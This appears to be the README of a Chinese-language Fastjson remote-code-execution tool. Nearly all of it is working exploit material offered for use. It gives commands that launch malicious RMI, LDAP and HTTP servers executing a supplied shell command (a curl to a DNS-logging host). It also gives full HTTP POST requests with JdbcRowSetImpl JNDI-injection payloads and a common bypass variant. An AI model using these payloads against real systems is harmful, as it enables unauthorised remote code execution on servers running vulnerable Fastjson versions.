# fastjson_rce_tool

```
1. 启动RMI服务
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"

2. 启动LDAP服务3
java -cp fastjson_tool.jar LDAPRefServer 127.0.0.1 8888 1099 "curl dnslog.wyzxxz.cn"

3. 启动LDAP服务2
java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"

4. 启动ldap服务1
java -cp fastjson_tool.jar LDAPRefServer http://127.0.0.1:8888/#Object 1099

5. 启动http服务器
java -cp fastjson_tool.jar EvilHttpService 127.0.0.1 8888
```


```

rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}

3. 查看日志是否curl成功

===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar LDAPRefServer 127.0.0.1 8888 1099 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}


3. 查看日志是否执行成功


===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1099/Object","autoCommit":true}


3. 查看日志是否执行成功

===================================================================================================

else:
有些环境可能利用不成功，可以尝试默认的测试方法,


=======================================================
最常用的2个如下：
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}

{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}}

```

